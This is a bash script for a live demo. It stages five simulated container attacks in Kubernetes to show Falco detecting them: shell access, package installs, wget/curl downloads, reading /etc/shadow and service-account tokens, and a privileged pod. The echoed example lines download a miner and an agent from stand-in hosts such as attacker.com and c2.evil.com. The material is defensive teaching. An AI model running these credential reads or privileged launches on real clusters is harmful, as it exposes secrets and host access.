#!/bin/bash
# ============================================================
# Runtime Attack Detection — 5 Hands-On Demos
# Run this LIVE during your video with Falco running
#
# Prerequisites:
#   - Kubernetes cluster running
#   - Falco installed (bash install.sh)
#   - Open 2 terminals:
#     Terminal 1: Run this script
#     Terminal 2: kubectl logs -n falco -l app.kubernetes.io/name=falco -f
# ============================================================

set -e

NAMESPACE="default"
POD_NAME="webapp"
POD_SELECTOR="deploy/webapp"
IMAGE="alpine:3.18"

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║        🎯 RUNTIME ATTACK DETECTION — 5 LIVE DEMOS          ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# ============================================================
# SETUP: Check if webapp is running, if not deploy victim pod
# ============================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  [SETUP] Checking target application..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Check if webapp exists (deployed from 00-vulnerable-app)
if kubectl get deploy/webapp --namespace=$NAMESPACE >/dev/null 2>&1; then
  echo "✅ Found 'webapp' deployment — attacking the running application"
  TARGET="deploy/webapp"
  TARGET_NAME="webapp"
else
  echo "⚠️  No webapp found. Deploying a victim pod instead..."
  kubectl run victim-pod --image=alpine:3.18 --namespace=$NAMESPACE -- sleep 3600 2>/dev/null || true
  kubectl wait --for=condition=ready pod/victim-pod --namespace=$NAMESPACE --timeout=60s
  TARGET="victim-pod"
  TARGET_NAME="victim-pod"
fi

echo ""
echo "  Target: $TARGET_NAME"
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  [INFO] Open a SECOND terminal and run:"
echo ""
echo "  kubectl logs -n falco -l app.kubernetes.io/name=falco -f"
echo ""
echo "  This will show Falco alerts in real-time."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "Press ENTER when your Falco log terminal is ready..."
read

# ============================================================
# DEMO 1: Detect Shell Access Inside Container
# ============================================================
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  DEMO 1: Detect Shell Access Inside Container               ║"
echo "╠══════════════════════════════════════════════════════════════╣"
echo "║                                                              ║"
echo "║  SCENARIO:                                                   ║"
echo "║  Attacker exploits a vulnerability (Log4Shell, RCE, SSRF)   ║"
echo "║  and gets interactive shell access inside the container.    ║"
echo "║                                                              ║"
echo "║  WHY IT'S DANGEROUS:                                         ║"
echo "║  Shell access = full control. Attacker can now:             ║"
echo "║  - Read files, steal credentials                            ║"
echo "║  - Download malware                                          ║"
echo "║  - Move laterally to other pods/services                    ║"
echo "║                                                              ║"
echo "║  COMMAND:                                                    ║"
echo "║  kubectl exec victim-pod -- sh -c 'whoami && id && hostname'║"
echo "║                                                              ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "Running attack..."
echo ""
kubectl exec $TARGET --namespace=$NAMESPACE -- sh -c "whoami && id && hostname"
echo ""
echo "┌──────────────────────────────────────────────────────────────┐"
echo "│  ⚡ FALCO ALERT: SHELL ACCESS DETECTED                       │"
echo "│                                                              │"
echo "│  Falco saw: proc.name = sh (shell spawned in container)     │"
echo "│  In production: This alert goes to Slack + PagerDuty        │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""
echo "Press ENTER for next demo..."
read

# ============================================================
# DEMO 2: Detect Package Installation
# ============================================================
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  DEMO 2: Detect Package Installation                        ║"
echo "╠══════════════════════════════════════════════════════════════╣"
echo "║                                                              ║"
echo "║  SCENARIO:                                                   ║"
echo "║  Attacker installs tools to move laterally or scan the      ║"
echo "║  network. In production, containers are IMMUTABLE — no      ║"
echo "║  package should ever be installed at runtime.               ║"
echo "║                                                              ║"
echo "║  WHY IT'S DANGEROUS:                                         ║"
echo "║  - Installing nmap → network reconnaissance                 ║"
echo "║  - Installing netcat → reverse shell                        ║"
echo "║  - Installing curl → download C2 agents                    ║"
echo "║  - Any install = container drift = compromise indicator     ║"
echo "║                                                              ║"
echo "║  COMMAND:                                                    ║"
echo "║  kubectl exec victim-pod -- apk add --no-cache nmap        ║"
echo "║                                                              ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "Running attack..."
echo ""
kubectl exec $TARGET --namespace=$NAMESPACE -- apk add --no-cache nmap 2>&1 || true
echo ""
echo "┌──────────────────────────────────────────────────────────────┐"
echo "│  ⚡ FALCO ALERT: PACKAGE MANAGER EXECUTED (container drift)  │"
echo "│                                                              │"
echo "│  Falco saw: proc.name = apk (package manager in container) │"
echo "│  In production: Container should be IMMUTABLE               │"
echo "│  Any package install = something is WRONG                   │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""
echo "Press ENTER for next demo..."
read

# ============================================================
# DEMO 3: Detect Curl/Wget Download
# ============================================================
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  DEMO 3: Detect Curl/Wget Download                          ║"
echo "╠══════════════════════════════════════════════════════════════╣"
echo "║                                                              ║"
echo "║  SCENARIO:                                                   ║"
echo "║  After getting shell access, attacker downloads malware,    ║"
echo "║  crypto miners, or C2 (Command & Control) agents using      ║"
echo "║  curl or wget.                                               ║"
echo "║                                                              ║"
echo "║  WHY IT'S DANGEROUS:                                         ║"
echo "║  - wget http://attacker.com/xmrig → crypto mining          ║"
echo "║  - curl http://c2.evil.com/agent → backdoor installed       ║"
echo "║  - Legitimate containers should NEVER download at runtime   ║"
echo "║                                                              ║"
echo "║  COMMANDS:                                                   ║"
echo "║  kubectl exec victim-pod -- wget http://example.com -O /tmp/payload  ║"
echo "║  kubectl exec victim-pod -- curl -o /tmp/agent http://example.com    ║"
echo "║                                                              ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "Running attack (wget)..."
echo ""
kubectl exec $TARGET --namespace=$NAMESPACE -- wget -q http://example.com -O /tmp/payload 2>&1 || true
echo ""
echo "Running attack (curl)..."
echo ""
kubectl exec $TARGET --namespace=$NAMESPACE -- sh -c "apk add --no-cache curl >/dev/null 2>&1; curl -s -o /tmp/agent http://example.com" 2>&1 || true
echo ""
echo "┌──────────────────────────────────────────────────────────────┐"
echo "│  ⚡ FALCO ALERT: DOWNLOAD TOOL USED IN CONTAINER             │"
echo "│                                                              │"
echo "│  Falco saw: proc.name = wget/curl inside container          │"
echo "│  In real attacks: This downloads crypto miners or malware   │"
echo "│  Your production container should NEVER use wget/curl       │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""
echo "Press ENTER for next demo..."
read

# ============================================================
# DEMO 4: Detect Sensitive File Access
# ============================================================
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  DEMO 4: Detect Sensitive File Access                        ║"
echo "╠══════════════════════════════════════════════════════════════╣"
echo "║                                                              ║"
echo "║  SCENARIO:                                                   ║"
echo "║  Attacker reads sensitive files to steal credentials:       ║"
echo "║  - /etc/shadow → system password hashes                    ║"
echo "║  - K8s service account token → access K8s API              ║"
echo "║  - /root/.aws/credentials → AWS access keys                ║"
echo "║  - /root/.ssh/id_rsa → SSH private keys                    ║"
echo "║                                                              ║"
echo "║  WHY IT'S DANGEROUS:                                         ║"
echo "║  - SA token = attacker can talk to Kubernetes API           ║"
echo "║  - AWS creds = attacker can access your cloud               ║"
echo "║  - Password hashes = offline cracking                       ║"
echo "║                                                              ║"
echo "║  COMMANDS:                                                   ║"
echo "║  kubectl exec victim-pod -- cat /etc/shadow                 ║"
echo "║  kubectl exec victim-pod -- cat /run/secrets/.../token      ║"
echo "║                                                              ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "Running attack (read /etc/shadow)..."
echo ""
kubectl exec $TARGET --namespace=$NAMESPACE -- cat /etc/shadow 2>&1
echo ""
echo "Running attack (read K8s service account token)..."
echo ""
kubectl exec $TARGET --namespace=$NAMESPACE -- cat /run/secrets/kubernetes.io/serviceaccount/token 2>&1 || echo "  (token not mounted — automountServiceAccountToken may be false)"
echo ""
echo "┌──────────────────────────────────────────────────────────────┐"
echo "│  ⚡ FALCO ALERT: CREDENTIAL ACCESS ATTEMPT                   │"
echo "│                                                              │"
echo "│  Falco saw: open_read on /etc/shadow and SA token           │"
echo "│  In real attacks: Attacker uses SA token to call K8s API    │"
echo "│  and escalate privileges across the cluster                 │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""
echo "Press ENTER for next demo..."
read

# ============================================================
# DEMO 5: Detect Privileged Container Activity
# ============================================================
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  DEMO 5: Detect Privileged Container Activity                ║"
echo "╠══════════════════════════════════════════════════════════════╣"
echo "║                                                              ║"
echo "║  SCENARIO:                                                   ║"
echo "║  A misconfigured or malicious workload runs as privileged.  ║"
echo "║  Privileged containers have FULL access to the host kernel. ║"
echo "║                                                              ║"
echo "║  WHY IT'S DANGEROUS:                                         ║"
echo "║  - Can access ALL host devices (/dev)                       ║"
echo "║  - Can mount host filesystem                                ║"
echo "║  - Can load kernel modules                                  ║"
echo "║  - Can escape container to host (trivial)                   ║"
echo "║  - Basically = running directly on the host                 ║"
echo "║                                                              ║"
echo "║  COMMAND:                                                    ║"
echo "║  kubectl run priv-pod --image=alpine --privileged=true      ║"
echo "║                                                              ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "Launching privileged container..."
echo ""
kubectl run privileged-pod --image=alpine:3.18 --namespace=$NAMESPACE \
  --overrides='{
    "spec": {
      "containers": [{
        "name": "privileged-pod",
        "image": "alpine:3.18",
        "command": ["sleep", "120"],
        "securityContext": {
          "privileged": true
        }
      }]
    }
  }' 2>/dev/null || true

kubectl wait --for=condition=ready pod/privileged-pod --namespace=$NAMESPACE --timeout=30s 2>/dev/null || true
echo ""
echo "┌──────────────────────────────────────────────────────────────┐"
echo "│  ⚡ FALCO ALERT: PRIVILEGED CONTAINER LAUNCHED               │"
echo "│                                                              │"
echo "│  Falco saw: container.privileged = true                     │"
echo "│  This container has FULL access to the host                 │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""
echo "--- Showing WHY privileged is dangerous ---"
echo ""
echo "Host devices visible to privileged container:"
kubectl exec privileged-pod --namespace=$NAMESPACE -- ls /dev 2>&1 | head -15
echo "..."
echo ""
echo "Host processes visible:"
kubectl exec privileged-pod --namespace=$NAMESPACE -- ps aux 2>&1 | head -5 || true
echo ""
echo "Host filesystem mountable:"
kubectl exec privileged-pod --namespace=$NAMESPACE -- sh -c "mount | wc -l" 2>&1 || true
echo " mount points accessible"
echo ""
echo "┌──────────────────────────────────────────────────────────────┐"
echo "│  🔴 This is why privileged containers are NEVER allowed      │"
echo "│     in production. Pod Security Standards block this.       │"
echo "│     But if it bypasses → Falco DETECTS it immediately.     │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""

# ============================================================
# SUMMARY
# ============================================================
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║                    📋 DETECTION SUMMARY                     ║"
echo "╠══════════════════════════════════════════════════════════════╣"
echo "║                                                              ║"
echo "║  Demo 1: Shell Access          → SHELL ACCESS DETECTED     ║"
echo "║  Demo 2: Package Install       → PACKAGE MANAGER EXECUTED  ║"
echo "║  Demo 3: Curl/Wget Download    → DOWNLOAD TOOL USED        ║"
echo "║  Demo 4: Sensitive File Read   → CREDENTIAL ACCESS ATTEMPT ║"
echo "║  Demo 5: Privileged Container  → PRIVILEGED CONTAINER      ║"
echo "║                                                              ║"
echo "║  All 5 attacks detected in REAL-TIME by Falco.             ║"
echo "║  In production, each alert → Slack/PagerDuty notification  ║"
echo "║                                                              ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Show actual Falco logs
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  Recent Falco Alerts:"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=30 2>/dev/null | grep -E "SHELL|CREDENTIAL|PACKAGE|DOWNLOAD|PRIVILEGED|BINARY|REVERSE" || echo "  Run: kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=30"
echo ""

# ============================================================
# CLEANUP
# ============================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  CLEANUP COMMANDS:"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "  kubectl delete pod victim-pod --namespace=$NAMESPACE 2>/dev/null"
echo "  kubectl delete pod privileged-pod --namespace=$NAMESPACE"
echo ""
echo "✅ All 5 attack demos complete!"
